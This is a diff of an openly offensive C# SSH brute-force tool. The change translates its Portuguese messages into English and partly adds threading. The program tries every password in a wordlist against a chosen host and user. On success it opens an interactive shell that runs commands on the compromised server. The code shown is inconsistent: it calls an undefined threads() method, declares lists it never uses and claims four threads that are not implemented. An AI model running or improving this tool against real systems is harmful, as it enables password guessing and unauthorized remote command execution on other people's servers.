@@ -1,19 +1,29 @@
 /*
-Programa desenvolvido por Diego Berger Tellaroli - https://github.com/diego-tella/
-Ainda está em desenvolvimento. Em breve irei adicionar threads e outras coisas para deixar o brute-force mais rápido.
+Program developed by Diego Berger Tellaroli - https://github.com/diego-tella/
+It is still in development. Soon I'll be adding threads and stuff to make brute-force faster.
+
 */
 using System;
 using System.IO;
 using Renci.SshNet;
 using System.Net.Sockets;
-using SshNet;
+using System.Threading;
+using System.Collections.Generic;
 
 namespace Brute_SSH
 {
-    class Program
+    public class Program
     {
+        //global variables
         public static bool bol1 = false;
         public static string[] senhas = new string[6];
+        public static string wordlist;
+
+        public static List<string> list1 = new List<string>();
+        public static List<string> list2 = new List<string>();
+        public static List<string> list3 = new List<string>();
+        public static List<string> list4 = new List<string>();
+
         public static void banner()
         {
             Console.ForegroundColor = ConsoleColor.Green;
@@ -34,37 +44,37 @@ namespace Brute_SSH
 
         static void Main(string[] args)
         {
-            //Variáveis
+            //variables
             string ip, pass, user, word, port;
             int porta;
             bool bol2 = false;
 
             banner();
-            Console.ForegroundColor = ConsoleColor.Green; //cor verde de REQUER XD
-            volt2:
-            Console.WriteLine("Digite o Host");
+            Console.ForegroundColor = ConsoleColor.Green; //green color of H4X0R 1337 XD
+        volt2:
+            Console.WriteLine("Enter the host");
             ip = Console.ReadLine();
-            if(ip == "")
+            if (ip == "")
             {
-                Console.WriteLine("IP Invalido.");
+                Console.WriteLine("Invalid IP");
                 goto volt2;
             }
 
-            Console.WriteLine("Digite a porta (enter para 22)");
+            Console.WriteLine("What is the port? (default 22)");
             port = Console.ReadLine();
 
-            volt1:
-            Console.WriteLine("Digite o usuário");
+        volt1:
+            Console.WriteLine("What is the user?");
             user = Console.ReadLine();
             if (user == "")
             {
-                Console.WriteLine("Usuário Invalido. Coloque novamente!");
+                Console.WriteLine("Invalid user. Type again!");
                 goto volt1;
             }
-            Console.WriteLine("Qual a wordlist? (enter para padrão) ");
+            Console.WriteLine("What wordlist? (hit enter for the default.) ");
             word = Console.ReadLine();
 
-            //Verificações
+            //verify
             if (word == "")
                 word = "wordlist.txt";
             if (port == "")
@@ -72,54 +82,56 @@ namespace Brute_SSH
             else
                 porta = Convert.ToInt32(port);
 
-            //Host ativo?
+            //Host active?
             try
             {
                 TcpClient sh = new TcpClient();
                 sh.Connect(ip, porta);
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 if (ex.ToString().Contains("10061"))
                 {
-                    Console.WriteLine("A porta " + porta + " do IP " + ip + " está fechada.");
+                    Console.WriteLine("Port " + porta + " of IP " + ip + " is closed.");
                     Environment.Exit(0);
                 }
                 else if (ex.ToString().Contains("11001"))
                 {
-                    Console.WriteLine("O alvo "+ip+" não existe. Cancelando ataque...");
+                    Console.WriteLine("The host " + ip + " does not exist. Canceling attack...");
                     Environment.Exit(0);
                 }
                 else if (ex.ToString().Contains("10060"))
                 {
-                    Console.WriteLine("o servidor SSH do IP " + ip + " está com um firewall dropando conexões.");
-                    Console.WriteLine("Deseja tentar mesmo assim? [y/n]");
+                    Console.WriteLine("The port" + porta+ " is not in service. Do you want to try anyway? [y/n]");
                     string resp = Console.ReadLine();
                     if (resp == "n")
                         Environment.Exit(0);
                 }
             }
-
+            Console.WriteLine("Loading wordlist...");
+            wordlist = word;
+            threads();
             int ae = -1;
             try
             {
-                StreamReader str = new StreamReader(word);
-                while ((pass = str.ReadLine()) != null)
+                StreamReader str = new StreamReader(word); ; //open wordlist
+                Console.WriteLine("Attack started with 4 threads.");
+                while ((pass = str.ReadLine()) != null) //start brute force
                 {
 
                     try
                     {
                         using (var client = new SshClient(ip, porta, user, pass))
                         {
-                            client.Connect();
-                            client.Disconnect();
+                            client.Connect(); //try connect
+                            client.Disconnect(); //If you connect successfully, the password is correct
                             ae++;
-                            senhas[ae] = pass;
-                            Console.WriteLine("[+] Senha Encontrada - " + pass + "\nDigite 1 para continuar com o ataque\nDigite 2 para abrir uma shell");
+                            senhas[ae] = pass; //save in an array
+                            Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to continue with the attack \nEnter 2 to open a shell");
                             string resp = Console.ReadLine();
                             if (resp == "2")
                             {
-                                Console.WriteLine("Abrindo shell...");
+                                Console.WriteLine("Opening shell...");
                                 client.Connect();
 
                                 while (true)
@@ -127,50 +139,44 @@ namespace Brute_SSH
                                     try
                                     {
                                         if (!bol2)
-                                            Console.WriteLine("Shell aberta. Digite exit para sair.");
+                                            Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                         else
                                             Console.Write("$ ");
                                         bol2 = true;
                                         var comand = Console.ReadLine();
-                                        var output = client.RunCommand(comand);
+                                        var output = client.RunCommand(comand); //run the command on shell
                                         if (comand.ToString() == "exit")
                                             break;
                                         else
                                             Console.WriteLine(output.Result);
                                     }
-                                    catch(Exception ex)
+                                    catch (Exception ex)
                                     {
-                                        if (ex.ToString().Contains("CommandText property is empty"))
-                                        {
-
-                                        }
-                                        else
-                                            Console.WriteLine("Erro!");
+                                        if (!ex.ToString().Contains("CommandText property is empty"))
+                                            Console.WriteLine("Error!");
                                     }
                                 }
                                 client.Disconnect();
                                 break;
                             }
                             else if (resp == "1")
-                            {
-                                Console.WriteLine("Continuando ataque...");
-                            }
+                                Console.WriteLine("Continuing attack...");
 
                         }
                     }
                     catch (Exception ex)
                     {
                         if (ex.ToString().Contains("Permission denied"))
-                            Console.WriteLine("[+] Senha errada - " + pass);
+                            Console.WriteLine("[+] Wrong password --> " + pass);
                         else if (ex.ToString().Contains("10051"))
                         {
-                            Console.WriteLine("Não foi possível conectar ao alvo.");
+                            Console.WriteLine("Could not connect to the target.");
                             bol1 = true;
                             break;
                         }
                         else
                         {
-                            Console.WriteLine("Erro Desconhecido: " + ex.ToString());
+                            Console.WriteLine("Unknown error: " + ex.ToString());
                             bol1 = true;
                             break;
                         }
@@ -180,32 +186,32 @@ namespace Brute_SSH
             }
             catch
             {
-                Console.WriteLine("O arquivo não existe.");
+                Console.WriteLine("The file does not exist.");
                 Environment.Exit(0);
             }
 
-            Console.WriteLine("\nFim do ataque.");
+            Console.WriteLine("\nEnd of the attack.");
             if (!bol1)
             {
-                Console.WriteLine("Senha encontradas para o usuário "+user+":");
+                Console.WriteLine("Password found for user " + user + ":");
                 bool found = false;
                 foreach (var item in senhas)
                 {
                     if (item != null)
                     {
-                        Console.WriteLine("[+] "+item);
+                        Console.WriteLine("[+] " + item);
                         found = true;
                     }
                     if (!found)
                     {
-                        Console.WriteLine("Nenhuma senha foi encontrada.");
+                        Console.WriteLine("No password was found.");
                         break;
                     }
                 }
             }
 
         }
+        
     }
 
 }
-
